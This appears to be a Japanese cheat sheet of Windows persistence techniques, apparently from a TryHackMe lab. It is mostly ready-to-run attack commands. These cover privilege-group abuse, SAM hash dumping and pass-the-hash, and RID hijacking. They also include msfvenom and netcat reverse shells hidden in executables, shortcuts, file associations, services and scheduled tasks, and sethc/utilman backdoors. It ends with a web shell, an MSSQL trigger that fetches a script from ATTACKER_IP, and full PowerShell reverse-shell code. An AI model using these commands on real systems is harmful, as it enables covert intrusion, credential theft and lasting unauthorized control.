# 永続化（Windows）

永続化とは、疑惑を持たれずにできるだけ長い間検出されずにシステムにバックドアを仕掛ける技術。

## グループ

```ps
# ユーザーを管理者グループに入れる
net localgroup administrators <user> /add

# バックアップ操作グループに入れる。WinRMも付与
net localgroup "Backup Operators" <user> /add
net localgroup "Remote Management Users" <user> /add

# リモート接続時にUACによって管理者権限をはく奪される機能を無効にする
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

## 権限

```ps
# 現在の権限を一時ファイルにエクスポート
secedit /export /cfg config.inf

# 権限の場所にユーザーを追加し、ファイル保存
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,thmuser2
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,thmuser2

# 変換、インポート
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```

## ハッシュダンプ

```ps
# SAM ファイルと SYSTEM ファイルのバックアップを作成
reg save hklm\system system.bak
reg save hklm\sam sam.bak

# ダウンロード（Evil-WinRM）
download system.bak
download sam.bak

# パスワードハッシュのダンプ
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# Pass-the-Hash でログイン
evil-winrm -i <ip> -u <user> -H <hashvalue>
```

### リモート接続セキュリティ記述子の構成ウィンドウを開く

```ps
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

## RID

```ps
# 任意のユーザーのRIDを確認（最後の数値がRID）
# 管理者のデフォルトは500。一般ユーザーは1000以降。
wmic useraccount get name,sid
```

psexec（sysinternals）でレジストリを開く

```ps
PsExec64.exe -i -s regedit
```

```text
HKLM\SAM\SAM\Domains\Account\Users\

RID値のエントリ中に「F」という値があり、位置0x30にRIDが保持されている。
その部分を、500(0x01F4)に書き換える。（F4, 01 の順）
```

この状態でログインすると、管理者のデスクトップが表示される。

## バックドア

本来の機能を維持したままリバースシェルを仕込む

### 実行ファイル

任意の exe ファイルにペイロードを埋め込む

```shell
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

### ショートカット

スクリプトを用意

```ps
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

ショートカットのターゲット設定。ウインドウが表示されないように。  
また、アイコンの見た目はプロパティ、ショートカットから変更可能。

```ps
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

### ファイル関連付け

```text
HKLM\Software\Classes\
に拡張子ごとのエントリがあり、そのデフォルト値はプログラムIDを意味する。
例えば、
HKLM\Software\Classes\.txt には「txtfile」というプログラムIDが入っている。

HKLM\Software\Classes\txtfile\shell\open\command
の中に、関連付けられたプログラムの参照が設定されている。

%SystemRoot%\system32\NOTEPAD.EXE %1
```

スクリプトを用意

```ps
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

レジストリ値を下記のように書き換える

```text
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor2.ps1 %1
```

## サービス

### サービス作成

ペイロードの作成

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

サービスの作成、開始

```ps
sc.exe create <servicename> binPath= "C:\Windows\System32\rev-svc.exe" start= auto
sc.exe start <servicename>
```

### 既存サービスの利用

利用可能なサービス一覧

```ps
sc.exe query state=all
```

サービス変更

```ps
sc.exe config <servicename> binPath= "C:\Windows\System32\rev-svc2.exe" start= auto obj= "LocalSystem"

sc.exe qc <servicename>
```

## タスクスケジューラ

```ps
# タスクの作成（1分ごとに起動する設定）
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM

# 正常に作成されたか確認
schtasks /query /tn thm-taskbackdoor
```

### セキュリティ記述子の削除

System 権限で PsExec を開く

```shell
PsExec64.exe -s -i regedit
```

```text
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\

タスクの SD値 をDeleteする。
```

これで、管理者含め全てのユーザーからタスクが見えなくなる。

## ログオントリガー

### スタートアップ

```text
# ユーザーごと
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# 全ユーザー
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

### 実行／一度だけ実行

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

（名前）任意
（Type）REG_EXPAND_SZ
（Data）c:\Windows\revshell.exe
```

### Winlogon

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\

Userinit: C:\Windows\System32\userinit.exe,
Shell: explorer.exe

次のように変更する。
Userinit: C:\Windows\System32\userinit.exe, C:\Windows\revshell.exe
```

### ログオンスクリプト

この環境変数は HKLM に相当するものが無いので、ユーザーごとに設定する必要がある。

```text
HKCU\Environment

（名前）UserInitMprLogonScript
（Type）REG_EXPAND_SZ
（Data）c:\Windows\revshell.exe
```

## ログオン画面

### スティッキーキー

Shift を 5 回押すことで、スティッキーキーをアクティブ化できる。そのとき、  
C:\Windows\System32\sethc.exe  
が実行される。  
これを cmd.exe に置き換えることで、認証前のログイン画面の状態でも、Shift キーを 5 回押すことでシェルを取得できる。

```ps
# 所有権を取得
takeown /f c:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
# 置き換え
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

### Utilman

ロック画面中の簡単操作オプションを提供するアプリケーション。  
スティッキーキーと同様、cmd.exe で置き換える。

```ps
takeown /f c:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

ロック画面で簡単操作ボタンを押すだけでシェルを取得できる。

## その他サービス

あくまで一例。

### ASP.NET Web シェル

適当な Web シェルをサーバーに保存する

https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx

```ps
move shell.aspx C:\inetpub\wwwroot\
icacls C:\inetpub\wwwroot\shell.aspx /grant Everyone:F
```

http://10.10.3.240/shell.aspx  
のような形でブラウザ空コマンドを実行できる。

### MSSQL トリガー

あるテーブルに INSERT したときのトリガーとして Powershell スクリプトを実行する。

Microsoft SQL Server Management Studio 18 の場合、「新しいクエリ」で次の SQL を実行。

xp_cmdshell を有効化。

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

全てのユーザーに sa ユーザー（デフォルトの DB 管理者）を偽装する権限を付与

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

HRDB.dbo.Employees テーブルに INSERT されるたびにトリガーさせる。

```sql
USE HRDB
```

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

evilscript.ps1

```ps
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```
